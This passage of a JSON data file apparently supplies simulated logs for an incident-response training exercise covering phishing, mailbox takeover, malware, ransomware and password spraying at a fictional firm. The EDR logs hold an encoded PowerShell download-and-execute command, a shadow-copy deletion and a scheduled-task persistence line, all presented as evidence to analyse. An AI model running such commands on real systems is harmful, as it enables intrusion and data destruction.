+"Laptop — assigned l.osei until 2026-08-11 (replaced, not yet collected)",
+"2026-08-18 07:12"
+],
+[
+"10.20.14.103",
+"iPhone-LOsei",
+"F2:1C:9A:44:0B:7E",
+"Personal phone — registered to l.osei in Intune (compliant)",
+"2026-08-18 10:50"
+],
+[
+"10.20.14.23",
+"FINANCE-03",
+"3C:52:82:1A:70:11",
+"Workstation — a.singh",
+"2026-08-18 07:35"
+],
+[
+"10.20.14.37",
+"FINANCE-07",
+"3C:52:82:1A:72:4C",
+"Workstation — dana.reyes",
+"2026-08-18 07:55"
+],
+[
+"10.20.14.55",
+"ACCT-05",
+"3C:52:82:1B:01:2A",
+"Workstation — s.morales",
+"2026-08-18 07:48"
+]
+]
+},
+{
+"name": "User Account — l.osei",
+"type": "kv",
+"guide": "Account facts that help explain the pattern.",
+"rows": [
+[
+"Password last changed",
+"2026-08-14 17:05 (Fri)"
+],
+[
+"Account locked",
+"No (cloud smart lockout counts failures separately)"
+],
+[
+"MFA method",
+"Microsoft Authenticator push (number matching OFF)"
+],
+[
+"Registered devices",
+"FINANCE-11, iPhone-LOsei"
+],
+[
+"User statement",
+"Was at desk; did not open Outlook on phone today; denied the prompts"
+]
+]
+}
+],
+"TCK-2001": [
+{
+"name": "Identity, Mail & Proxy Timeline — r.castillo",
+"type": "table",
+"guide": "Combined SIEM search for this user across sign-in, mail and proxy logs, including the days before the alert. Read it in time order. Legacy protocols such as IMAP do not support MFA prompts, so Conditional Access/MFA is often not applied to them.",
+"cols": [
+"Time",
+"Source",
+"User",
+"Client IP",
+"Detail",
+"Result"
+],
+"rows": [
+[
+"2026-08-15 10:13:40",
+"Mail",
+"r.castillo",
+"—",
+"From: \"SharePoint\" <share@docs-sharepoint-files.com> Subject: Rafael shared \"Q3 Pricing.xlsx\" with you",
+"Delivered"
+],
+[
+"2026-08-15 10:14:22",
+"Proxy",
+"r.castillo",
+"10.20.16.26",
+"docs-sharepoint-files.com — GET /q3-pricing",
+"Allowed (Uncategorized)"
+],
+[
+"2026-08-15 10:14:58",
+"Proxy",
+"r.castillo",
+"10.20.16.26",
+"docs-sharepoint-files.com — POST /auth/login",
+"Allowed (Uncategorized)"
+],
+[
+"2026-08-18 08:02:11",
+"Sign-in",
+"r.castillo",
+"198.51.100.24",
+"Windows Sign-in — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 09:03:05",
+"Sign-in",
+"e.foster",
+"198.51.100.24",
+"Windows Sign-in — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 10:02:29",
+"Sign-in",
+"h.patel",
+"198.51.100.24",
+"Outlook Web — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 10:13:22",
+"Sign-in",
+"m.hall",
+"198.51.100.24",
+"Outlook Web — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 10:24:05",
+"Sign-in",
+"m.hall",
+"198.51.100.24",
+"Teams — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 10:28:00",
+"Sign-in",
+"h.patel",
+"198.51.100.24",
+"Teams — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 10:35:20",
+"Sign-in",
+"k.tran",
+"198.51.100.24",
+"Outlook Web — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 12:18:30",
+"Sign-in",
+"r.castillo",
+"198.51.100.24",
+"Outlook Web — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 12:37:02",
+"Sign-in",
+"r.castillo",
+"89.38.97.114",
+"IMAP4 (legacy auth) — Bucharest, RO",
+"Success — single-factor; Conditional Access: not applied (legacy client)"
+],
+[
+"2026-08-18 12:38:15",
+"Sign-in",
+"r.castillo",
+"89.38.97.114",
+"Outlook Web — Bucharest, RO",
+"Failure — MFA denied by user"
+],
+[
+"2026-08-18 12:41:12",
+"Sign-in",
+"k.tran",
+"198.51.100.24",
+"Outlook Web — St. Louis, MO (HQ)",
+"Success — MFA approved"
+],
+[
+"2026-08-18 12:42:18",
+"Sign-in",
+"e.foster",
+"198.51.100.24",
+"Windows Sign-in — St. Louis, MO (HQ)",
+"Success — MFA approved"
+]
+]
+},
+{
+"name": "Mailbox Audit Log — r.castillo",
+"type": "table",
+"guide": "Actions taken inside the mailbox. Attackers commonly add inbox rules to hide replies and set forwarding to keep a copy of mail. Compare client IPs to the sign-in log.",
+"cols": [
+"Time",
+"Client IP",
+"Operation",
+"Target",
+"Detail"
+],
+"rows": [
+[
+"2026-08-18 09:10:12",
+"198.51.100.24",
+"MailItemsAccessed",
+"INBOX",
+"Normal client access (Outlook desktop)"
+],
+[
+"2026-08-18 11:44:51",
+"198.51.100.24",
+"Send",
+"Sent Items",
+"\"RE: Halvorsen quote\" to customer"
+],
+[
+"2026-08-18 12:37:09",
+"89.38.97.114",
+"IMAP LOGIN",
+"r.castillo",
+"—"
+],
+[
+"2026-08-18 12:39:44",
+"89.38.97.114",
+"IMAP FETCH (bulk)",
+"INBOX, Sent Items",
+"1,842 messages downloaded"
+],
+[
+"2026-08-18 12:41:20",
+"89.38.97.114",
+"New-InboxRule",
+"Rule name: \".\"",
+"If subject/body contains \"invoice\",\"payment\",\"wire\",\"bank\" → move to RSS Feeds, mark as read"
+],
+[
+"2026-08-18 12:42:03",
+"89.38.97.114",
+"Set-Mailbox",
+"ForwardingSmtpAddress",
+"r.castillo.sales@protonmail.com (DeliverToMailboxAndForward = True)"
+],
+[
+"2026-08-18 12:52:37",
+"89.38.97.114",
+"IMAP LOGOUT",
+"r.castillo",
+"—"
+]
+]
+},
+{
+"name": "IP Reputation — 89.38.97.114",
+"type": "kv",
+"guide": "Threat-intel lookup for the foreign IP.",
+"rows": [
+[
+"Location",
+"Bucharest, Romania"
+],
+[
+"Network",
+"Hosting provider (VPS) — not a consumer ISP"
+],
+[
+"Reputation",
+"Reported 37 times in 30 days (credential abuse, IMAP brute force)"
+],
+[
+"Other Cedar Creek accounts from this IP",
+"None found"
+],
+[
+"User statement",
+"At desk in St. Louis all day, no travel, no personal VPN"
+]
+]
+}
+],
+"TCK-2002": [
+{
+"name": "EDR Telemetry — FINANCE-07",
+"type": "table",
+"guide": "Endpoint events around the alert. \"→\" shows parent → child process. Quarantine removes ONE file — check what the malware did in the seconds before it was stopped (files written, scheduled tasks, other processes, network connections). The PowerShell -enc value is Base64 of UTF-16LE text: decode it with CyberChef (From Base64 → Decode text UTF-16LE).",
+"cols": [
+"Time",
+"Host",
+"Process",
+"Event",
+"EDR Action"
+],
+"rows": [
+[
+"2026-08-18 12:01:02",
+"FINANCE-07",
+"chrome.exe",
+"Process start",
+"Observed"
+],
+[
+"2026-08-18 12:02:52",
+"FINANCE-07",
+"svchost.exe",
+"Network connect 142.250.0.0/15:443",
+"Observed"
+],
+[
+"2026-08-18 12:05:16",
+"FINANCE-07",
+"EXCEL.EXE",
+"File write: Budget_Aug.xlsx",
+"Observed"
+],
+[
+"2026-08-18 12:24:53",
+"FINANCE-07",
+"OUTLOOK.EXE",
+"DNS query outlook.office365.com",
+"Observed"
+],
+[
+"2026-08-18 12:42:57",
+"FINANCE-07",
+"svchost.exe",
+"Network connect 142.250.0.0/15:443",
+"Observed"
+],
+[
+"2026-08-18 12:52:43",
+"FINANCE-07",
+"svchost.exe",
+"File write: Budget_Aug.xlsx",
+"Observed"
+],
+[
+"2026-08-18 12:58:33",
+"FINANCE-07",
+"svchost.exe",
+"DNS query outlook.office365.com",
+"Observed"
+],
+[
+"2026-08-18 13:16:02",
+"FINANCE-07",
+"OUTLOOK.EXE",
+"Attachment saved: %TEMP%\\invoice_aug.pdf.exe",
+"Observed"
+],
+[
+"2026-08-18 13:18:41",
+"FINANCE-07",
+"explorer.exe → invoice_aug.pdf.exe",
+"Process start (user dana.reyes) — unsigned, SHA256 9f2c…e41a",
+"Observed"
+],
+[
+"2026-08-18 13:18:42",
+"FINANCE-07",
+"invoice_aug.pdf.exe",
+"File write: C:\\ProgramData\\odsync\\odsync.exe",
+"Observed"
+],
+[
+"2026-08-18 13:18:42",
+"FINANCE-07",
+"invoice_aug.pdf.exe → schtasks.exe",
+"schtasks /create /tn \"OneDriveSyncUpd\" /tr C:\\ProgramData\\odsync\\odsync.exe /sc onlogon /rl highest",
+"Observed"
+],
+[
+"2026-08-18 13:18:43",
+"FINANCE-07",
+"invoice_aug.pdf.exe → powershell.exe",
+"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADIALgAyADEAMgAuADYAMQAvAHMAMgAuAHAAcwAxACcAKQA=",
+"BLOCKED"
+],
+[
+"2026-08-18 13:18:44",
+"FINANCE-07",
+"EDR",
+"invoice_aug.pdf.exe quarantined",
+"Quarantined"
+],
+[
+"2026-08-18 13:19:05",
+"FINANCE-07",
+"svchost.exe → odsync.exe",
+"Process start via scheduled task test-run",
+"Observed"
+],
+[
+"2026-08-18 13:19:07",
+"FINANCE-07",
+"odsync.exe",
+"Network connect 45.142.212.61:443 (TLS)",
+"Allowed"
+],
+[
+"2026-08-18 13:19:40",
+"FINANCE-07",
+"chrome.exe",
+"Network connect 52.112.0.0/14:443",
+"Observed"
+],
+[
+"2026-08-18 13:37:02",
+"FINANCE-07",
+"OUTLOOK.EXE",
+"Network connect 52.112.0.0/14:443",
+"Observed"
+],
+[
+"2026-08-18 13:46:31",
+"FINANCE-07",
+"chrome.exe",
+"Process start",
+"Observed"
+],
+[
+"2026-08-18 13:49:07",
+"FINANCE-07",
+"odsync.exe",
+"Network connect 45.142.212.61:443 (TLS) — beacon every ~30 min",
+"Allowed"
+]
+]
+},
+{
+"name": "Mail Gateway — Message Trace",
+"type": "table",
+"guide": "Who else received the same attachment? Filter on the sender.",
+"cols": [
+"Time",
+"Sender",
+"Recipient",
+"Subject",
+"Attachment",
+"Status"
+],
+"rows": [
+[
+"2026-08-18 12:14:47",
+"a.singh@cedarcreek-ind.com",
+"a.singh",
+"Payroll reminder",
+"—",
+"Delivered"
+],
+[
+"2026-08-18 12:31:16",
+"orders@acme-supply.com",
+"a.singh",
+"PO 4471-B",
+"—",
+"Delivered"
+],
+[
+"2026-08-18 12:40:01",
+"a.singh@cedarcreek-ind.com",
+"s.morales",
+"RE: month-end close",
+"—",
+"Delivered"
+],
+[
+"2026-08-18 12:42:33",
+"orders@acme-supply.com",
+"s.morales",
+"RE: month-end close",
+"—",
+"Delivered"
+],
+[
+"2026-08-18 13:04:30",
+"a.singh@cedarcreek-ind.com",
+"a.singh",
+"PO 4471-B",
+"—",
+"Delivered"
+],
+[
+"2026-08-18 13:14:22",
+"billing@vendor-billing-portal.com",
+"dana.reyes",
+"August invoice — OVERDUE",
+"invoice_aug.pdf.exe (412 KB)",
+"Delivered"
+],
+[
+"2026-08-18 13:14:23",
+"billing@vendor-billing-portal.com",
+"a.singh",
+"August invoice — OVERDUE",
+"invoice_aug.pdf.exe (412 KB)",
+"Delivered"
+],
+[
+"2026-08-18 13:14:23",
+"billing@vendor-billing-portal.com",
+"s.morales",
+"August invoice — OVERDUE",
+"invoice_aug.pdf.exe (412 KB)",
+"Delivered"
+],
+[
+"2026-08-18 13:14:24",
+"billing@vendor-billing-portal.com",
+"g.palmer",
+"August invoice — OVERDUE",
+"invoice_aug.pdf.exe (412 KB)",
+"Delivered"
+],
+[
+"2026-08-18 13:16:51",
+"orders@acme-supply.com",
+"a.singh",
+"PO 4471-B",
+"—",
+"Delivered"
+]
+]
+},
+{
+"name": "File Reputation",
+"type": "kv",
+"guide": "Threat-intel lookups for the files and IP in the EDR log.",
+"rows": [
+[
+"invoice_aug.pdf.exe",
+"SHA256 9f2c…e41a — 41/72 engines: Trojan.Loader (first seen 2026-08-17)"
+],
+[
+"odsync.exe",
+"SHA256 c07b…91d2 — 3/72 engines: generic backdoor; NOT quarantined"
+],
+[
+"45.142.212.61",
+"Known command-and-control server (reported 2026-08-16)"
+],
+[
+"Other hosts with either hash",
+"None yet (search run 13:30)"
+],
+[
+"dana.reyes lockout (TCK-1001)",
+"Happened 07:58–08:06, before this email arrived at 13:14"
+]
+]
+}
+],
+"TCK-2003": [
+{
+"name": "Folder Permissions — \\\\fileserver\\Finance\\Budgets",
+"type": "table",
+"guide": "Current access control list (who can reach the folder).",
+"cols": [
+"Group / Account",
+"Permission",
+"Members"
+],
+"rows": [
+[
+"SG-Finance-Budgets-RW",
+"Modify",
+"g.palmer, a.singh, s.morales"
+],
+[
+"SG-Finance-Budgets-R",
+"Read",
+"Finance department (9 users)"
+],
+[
+"Domain Admins",
+"Full control",
+"IT admins"
+],
+[
+"k.tran",
+"— (no access)",
+"—"
+]
+]
+},
+{
+"name": "Folder Contents (top level)",
+"type": "table",
+"guide": "What the folder actually holds. Ask: does the requester need ALL of this?",
+"cols": [
+"Item",
+"Classification",
+"Last modified"
+],
+"rows": [
+[
+"FY2027 Draft Budget.xlsx",
+"Confidential",
+"2026-08-12"
+],
+[
+"Salaries by Department FY2026.xlsx",
+"Restricted (HR/Finance only)",
+"2026-07-31"
+],
+[
+"Marketing Spend Actuals Q1–Q2.xlsx",
+"Internal",
+"2026-08-05"
+],
+[
+"Bank Covenants 2026.pdf",
+"Confidential",
+"2026-06-18"
+],
+[
+"Archive\\ (2019–2025)",
+"Confidential",
+"—"
+]
+]
+},
+{
+"name": "Data Owner & Approvals",
+"type": "kv",
+"guide": "Who must approve access, and what approvals are already recorded.",
+"rows": [
+[
+"Data owner (data inventory)",
+"Greg Palmer, CFO"
+],
+[
+"Requester",
+"Kevin Tran, Marketing Analyst"
+],
+[
+"Requester manager",
+"Laura Kim, Marketing Director"
+],
+[
+"Approval from Laura Kim in ticket",
+"None (user says \"manager said it is fine\")"
+],
+[
+"Approval from data owner",
+"None"
+],
+[
+"Access policy",
+"Finance data: data-owner approval required; grant least privilege; time-bound for non-Finance staff"
+]
+]
+}
+],
+"TCK-2004": [
+{
+"name": "Troubleshooting Output (Plant vs. HQ)",
+"type": "text",
+"guide": "Command output collected from one affected Plant PC and one working HQ PC. Compare them line by line: same DNS answer? Where does the path stop?",
+"text": "=== From PLANT-PC-07 (10.40.2.57, Plant office) ===\nC:\\> nslookup portal.acme-supply.com\nServer:  dc01.cedarcreek.local\nAddress: 10.10.1.10\nName:    portal.acme-supply.com\nAddress: 203.0.113.80\n\nC:\\> Test-NetConnection portal.acme-supply.com -Port 443\nComputerName     : portal.acme-supply.com\nRemoteAddress    : 203.0.113.80\nRemotePort       : 443\nSourceAddress    : 10.40.2.57\nTcpTestSucceeded : False\n\nC:\\> tracert -d portal.acme-supply.com\n  1    <1 ms   10.40.2.1        (Plant firewall)\n  2     4 ms   192.0.2.1        (Plant ISP gateway)\n  3    11 ms   192.0.2.254\n  4    15 ms   198.18.40.9\n  5     *        *        *     Request timed out.\n  6     *        *        *     Request timed out.\n\n=== From ACCT-05 (10.20.14.55, HQ) ===\nC:\\> nslookup portal.acme-supply.com\nName:    portal.acme-supply.com\nAddress: 203.0.113.80\n\nC:\\> Test-NetConnection portal.acme-supply.com -Port 443\nRemoteAddress    : 203.0.113.80\nSourceAddress    : 10.20.14.55\nTcpTestSucceeded : True\n\nC:\\> tracert -d portal.acme-supply.com\n  1    <1 ms   10.20.0.1        (HQ firewall)\n  2     3 ms   198.51.100.1     (HQ ISP gateway)\n  3     9 ms   198.18.12.3\n  4    14 ms   198.18.40.9\n  5    18 ms   203.0.113.80     (portal.acme-supply.com)"
+},
+{
+"name": "Firewall Logs (14:00–15:00)",
+"type": "table",
+"guide": "Outbound sessions through each office firewall. \"NAT →\" shows the PUBLIC IP the outside world sees. \"Allow\" means OUR firewall let it out — look at whether the server ever answered.",
+"cols": [
+"Time",
+"Firewall",
+"Source",
+"Destination",
+"NAT",
+"Action",
+"Session result"
+],
+"rows": [
+[
+"2026-08-18 14:00:30",
+"PLANT-FW",
+"10.40.2.27",
+"142.250.72.4:443",
+"NAT → 192.0.2.45",
+"Allow",
+"Session completed"
+],
+[
+"2026-08-18 14:01:18",
+"PLANT-FW",
+"10.40.2.61",
+"203.0.113.80:443",
+"NAT → 192.0.2.45",
+"Allow",
+"No reply from server (SYN sent, no SYN-ACK)"
+],
+[
+"2026-08-18 14:04:38",
+"PLANT-FW",
+"10.40.2.38",
+"142.250.72.4:443",
+"NAT → 192.0.2.45",
+"Allow",
+"Session completed"
+],
+[
+"2026-08-18 14:04:52",
+"PLANT-FW",
+"10.40.2.33",
+"203.0.113.80:443",
+"NAT → 192.0.2.45",
+"Allow",
+"No reply from server (SYN sent, no SYN-ACK)"
+],
+[
+"2026-08-18 14:17:24",
+"PLANT-FW",
+"10.40.2.48",
+"203.0.113.80:443",
+"NAT → 192.0.2.45",
+"Allow",
+"No reply from server (SYN sent, no SYN-ACK)"
+],
+[
+"2026-08-18 14:18:45",
+"PLANT-FW",
+"10.40.2.86",
+"142.250.72.4:443",
+"NAT → 192.0.2.45",
+"Allow",
+"Session completed"
+],
+[
+"2026-08-18 14:19:05",
+"PLANT-FW",
+"10.40.2.57",
+"203.0.113.80:443",
+"NAT → 192.0.2.45",
+"Allow",
+"No reply from server (SYN sent, no SYN-ACK)"
+],
+[
+"2026-08-18 14:23:08",
+"HQ-FW",
+"10.20.14.58",
+"203.0.113.80:443",
+"NAT → 198.51.100.24",
+"Allow",
+"Session completed"
+],
+[
+"2026-08-18 14:29:29",
+"PLANT-FW",
+"10.40.2.35",
+"13.107.42.14:443",
+"NAT → 192.0.2.45",
+"Allow",
+"Session completed"
+],
+[
+"2026-08-18 14:37:05",
+"HQ-FW",
+"10.20.14.29",
+"203.0.113.80:443",
+"NAT → 198.51.100.24",
+"Allow",
+"Session completed"
+],
+[
+"2026-08-18 14:41:47",
+"PLANT-FW",
+"10.40.2.58",
+"13.107.42.14:443",
+"NAT → 192.0.2.45",
+"Allow",
+"Session completed"
+],
+[
+"2026-08-18 14:43:06",
+"PLANT-FW",
+"10.40.2.47",
+"13.107.42.14:443",
+"NAT → 192.0.2.45",
+"Allow",
+"Session completed"
+],
+[
+"2026-08-18 14:58:59",
+"HQ-FW",
+"10.20.14.33",
+"203.0.113.80:443",
+"NAT → 198.51.100.24",
+"Allow",
+"Session completed"
+]
+]
+},
+{
+"name": "Vendor Notice (email to IT, 2026-08-14)",
+"type": "text",
+"guide": "Recent vendor communication found in the IT shared mailbox.",
+"text": "From: support@acme-supply.com\nSubject: Portal migration this weekend\n\nOn Sun 2026-08-17 we are moving portal.acme-supply.com to a new hosting platform.\nAccess will be restricted to customer IP addresses on file. Our records for\nCedar Creek Industries list: 198.51.100.24\nIf you need additional IPs allowed, reply with them before Friday."
+}
+],
+"TCK-2005": [
+{
+"name": "DLP Console Events (08-18)",
+"type": "table",
+"guide": "Data-loss-prevention events for the day. Compare the alert to normal USB use by others (size, classification, device type).",
+"cols": [
+"Time",
+"User",
+"Host",
+"Channel",
+"Content",
+"Classification",
+"Action"
+],
+"rows": [
+[
+"2026-08-18 11:56:07",
+"c.wu",
+"ENG-11",
+"USB copy",
+"1 file / 310 MB — Training-video.mp4",
+"Internal",
+"Allowed (company encrypted USB)"
+],
+[
+"2026-08-18 14:23:14",
+"b.kim",
+"ENG-03",
+"USB copy",
+"1 file / 1 MB — Spec-sheet-ACM40.pdf",
+"Internal",
+"Allowed (company encrypted USB)"
+],
+[
+"2026-08-18 15:11:04",
+"t.becker",
+"ENG-14",
+"USB copy",
+"182 files / 2.3 GB — \\\\fileserver\\Engineering\\Projects\\Halvorsen-Pump\\*.dwg",
+"Confidential",
+"Audit only (policy: alert)"
+],
+[
+"2026-08-18 15:40:32",
+"p.nguyen",
+"ENG-09",
+"USB copy",
+"1 file / 4 MB — Shop-floor-layout.pdf",
+"Internal",
+"Allowed (company encrypted USB)"
+]
+]
+},
+{
+"name": "USB Device & Exceptions",
+"type": "kv",
+"guide": "Details of the device used and whether an exception/approval exists.",
+"rows": [
+[
+"Device",
+"SanDisk Extreme 128 GB, serial 4C531001…"
+],
+[
+"Company-issued?",
+"No — personal device, not encrypted (no BitLocker To Go)"
+],
+[
+"Removable-media exception register",
+"No entry for t.becker"
+],
+[
+"Customer delivery request on file",
+"None found for Halvorsen project"
+],
+[
+"Manager",
+"Self (t.becker is Engineering Manager) — escalate to Director of Engineering"
+]
+]
+},
+{
+"name": "Context (HR / Security, via proper channel)",
+"type": "kv",
+"guide": "Background provided by HR to the security lead. Context is not proof of intent.",
+"rows": [
+[
+"Employment status",
+"Resignation submitted 2026-08-14; last day 2026-08-28"
+],
+[
+"New employer (per HR)",
+"Not disclosed"
+],
+[
+"Prior DLP events",
+"None in 12 months"
+],
+[
+"ENG-14 logon sessions 08-18",
+"Interactive 07:52–17:42 (t.becker), then logged off"
+]
+]
+}
+],
+"TCK-3001": [
+{
+"name": "EDR Telemetry — FINANCE-07 (08-19 morning)",
+"type": "table",
+"guide": "What started the encryption. Compare process names and the scheduled task to TCK-2002 from yesterday.",
+"cols": [
+"Time",
+"Host",
+"Process",
+"Event",
+"EDR Action"
+],
+"rows": [
+[
+"2026-08-19 07:24:51",
+"FINANCE-07",
+"winlogon",
+"Interactive logon dana.reyes",
+"Observed"
+],
+[
+"2026-08-19 07:25:03",
+"FINANCE-07",
+"svchost.exe → odsync.exe",
+"Started by scheduled task \"OneDriveSyncUpd\" (on logon)",
+"Observed"
+],
+[
+"2026-08-19 07:27:40",
+"FINANCE-07",
+"odsync.exe",
+"File write: C:\\ProgramData\\odsync\\ckl.exe",
+"Observed"
+],
+[
+"2026-08-19 07:28:55",
+"FINANCE-07",
+"ckl.exe → vssadmin.exe",
+"vssadmin delete shadows /all /quiet",
+"BLOCKED"
+],
+[
+"2026-08-19 07:29:30",
+"FINANCE-07",
+"ckl.exe",
+"SMB connect \\\\SHARE-01\\Finance, \\\\SHARE-01\\Shared, \\\\SHARE-01\\HR (as dana.reyes)",
+"Observed"
+],
+[
+"2026-08-19 07:30:02",
+"FINANCE-07",
+"ckl.exe",
+"Mass file rename → *.ckl0ck (ransomware behavior)",
+"Alert only (host in Detect mode)"
+],
+[
+"2026-08-19 07:30:05",
+"FINANCE-07",
+"ckl.exe",
+"File write: RESTORE_YOUR_FILES.txt (every folder)",
+"Alert only"
+]
+]
+},
+{
+"name": "SHARE-01 File Audit (summary per minute)",
+"type": "table",
+"guide": "File-server audit events (4663) summarized. Shows which shares are being encrypted, how fast, and from which user / IP. Normal users opening files are mixed in.",
+"cols": [
+"Time",
+"Share",
+"Activity",
+"Account / Source"
+],
+"rows": [
+[
+"2026-08-19 07:25",
+"Finance",
+"Normal file open/save (1–5 files)",
+"k.tran from 10.20.16.44"
+],
+[
+"2026-08-19 07:26",
+"Shared",
+"Normal file open/save (1–5 files)",
+"e.foster from 10.20.18.15"
+],
+[
+"2026-08-19 07:30",
+"Finance",
+"412 files renamed to .ckl0ck",
+"dana.reyes from 10.20.14.37"
+],
+[
+"2026-08-19 07:31",
+"Finance",
+"1,980 files renamed to .ckl0ck",
+"dana.reyes from 10.20.14.37"
+],
+[
+"2026-08-19 07:32",
+"Finance",
+"2,215 files renamed to .ckl0ck",
+"dana.reyes from 10.20.14.37"
+],
+[
+"2026-08-19 07:34",
+"Shared",
+"1,740 files renamed to .ckl0ck",
+"dana.reyes from 10.20.14.37"
+],
+[
+"2026-08-19 07:37",
+"Shared",
+"2,302 files renamed to .ckl0ck",
+"dana.reyes from 10.20.14.37"
+],
+[
+"2026-08-19 07:40",
+"HR",
+"1,106 files renamed to .ckl0ck",
+"dana.reyes from 10.20.14.37"
+],
+[
+"2026-08-19 07:43",
+"HR",
+"1,288 files renamed to .ckl0ck",
+"dana.reyes from 10.20.14.37"
+],
+[
+"2026-08-19 07:43",
+"Shared",
+"Normal file open/save (1–5 files)",
+"a.singh from 10.20.14.23"
+],
+[
+"2026-08-19 07:45",
+"Shared",
+"954 files renamed to .ckl0ck",
+"dana.reyes from 10.20.14.37 (still running)"
+],
+[
+"2026-08-19 07:53",
+"Finance",
+"Normal file open/save (1–5 files)",
+"e.foster from 10.20.18.15"
+],
+[
+"2026-08-19 07:53",
+"Finance",
+"Normal file open/save (1–5 files)",
+"e.foster from 10.20.18.15"
+],
+[
+"2026-08-19 07:57",
+"Shared",
+"Normal file open/save (1–5 files)",
+"s.morales from 10.20.14.55"
+]
+]
+},
+{
+"name": "Backup Console — BACKUP-01",
+"type": "table",
+"guide": "Backup jobs and configuration changes. Before restoring, confirm a restore point exists from BEFORE the encryption started, and that the backup system itself was not tampered with.",
+"cols": [
+"Time",
+"Job / Setting",
+"Result",
+"By"
+],
+"rows": [
+[
+"2026-08-16 22:00:00",
+"Weekly offline tape",
+"Success — tape CC-W33 sent off-site",
+"scheduler"
+],
+[
+"2026-08-18 01:00:12",
+"Nightly SHARE-01",
+"Success — restore point RP-0818",
+"scheduler"
+],
+[
+"2026-08-19 01:00:09",
+"Nightly SHARE-01",
+"Success — restore point RP-0819",
+"scheduler"
+],
+[
+"2026-08-19 03:14:22",
+"Retention policy",
+"Changed 30 days → 1 day",
+"CEDARCREEK\\svc-backup (from 10.99.0.23)"
+],
+[
+"2026-08-19 03:14:40",
+"Restore point cleanup",
+"28 restore points deleted (RP-0721 … RP-0818)",
+"CEDARCREEK\\svc-backup"
+]
+]
+},
+{
+"name": "Ransom Note (RESTORE_YOUR_FILES.txt)",
+"type": "text",
+"guide": "Preserve the note as evidence. Do not contact the attackers.",
+"text": "Your network has been encrypted by CKL0CK.\nWe also downloaded your confidential data.\nIf you do not contact us within 72 hours your data will be published.\nContact: ckl0ck-support[.]onion   Your ID: CC-7731-0819\nDo not rename files or use recovery tools."
+}
+],
+"TCK-3002": [
+{
+"name": "SIEM Summary — VPN Authentication 23:00–02:14",
+"type": "kv",
+"guide": "Totals for the attack window.",
+"rows": [
+[
+"Failed logins",
+"9,412"
+],
+[
+"Unique source IPs",
+"62 (10 countries)"
+],
+[
+"Unique usernames tried",
+"148 (131 are real Cedar Creek accounts)"
+],
+[
+"Attempts per username",
+"~3 per hour (stays under the 5-attempt lockout threshold)"
+],
+[
+"Accounts locked out",
+"0"
+],
+[
+"Successful logins",
+"2 — svc-backup, j.owens"
+]
+]
+},
+{
+"name": "VPN Gateway Log (sample + all successes)",
+"type": "table",
+"guide": "A sample of the failed attempts plus every success. Filter \"success\" to see the compromised accounts and the internal VPN IP each one received — use those IPs to track what they did next.",
+"cols": [
+"Time",
+"User",
+"Source IP",
+"Country",
+"Result",
+"Assigned VPN IP"
+],
+"rows": [
+[
+"2026-08-18 23:01:52",
+"j.owens",
+"58.122.184.246",
+"IN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:05:59",
+"g.palmer",
+"115.49.48.169",
+"UA",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:06:00",
+"t.becker",
+"90.216.115.236",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:06:04",
+"l.osei",
+"165.242.150.51",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:16:39",
+"c.wu",
+"84.25.108.129",
+"IN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:16:47",
+"m.hall",
+"101.77.1.186",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:17:57",
+"j.owens",
+"129.103.166.116",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:20:15",
+"n.brooks",
+"97.208.146.53",
+"NL",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:24:02",
+"s.morales",
+"47.206.236.17",
+"VN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:26:45",
+"test",
+"109.15.6.51",
+"IN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:35:48",
+"h.patel",
+"128.92.197.212",
+"VN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:38:09",
+"p.nguyen",
+"44.55.7.251",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:38:46",
+"test",
+"83.209.3.211",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:39:31",
+"administrator",
+"78.230.58.126",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:41:45",
+"l.osei",
+"63.161.65.137",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:49:53",
+"l.osei",
+"106.72.146.70",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:51:18",
+"svc-backup",
+"48.53.127.250",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:51:59",
+"l.osei",
+"208.198.39.157",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-18 23:56:18",
+"j.owens",
+"61.13.49.155",
+"CN",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:00:27",
+"g.palmer",
+"139.30.211.25",
+"RO",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:14:08",
+"r.castillo",
+"148.159.229.174",
+"BR",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:15:17",
+"r.castillo",
+"161.81.49.199",
+"US",
+"Auth failed — bad password",
+"—"
+],
+[
+"2026-08-19 00:18:56",
+"admin",
+"79.84.17.103",
+"VN",
+"Auth failed — bad password",
+"—"
+],
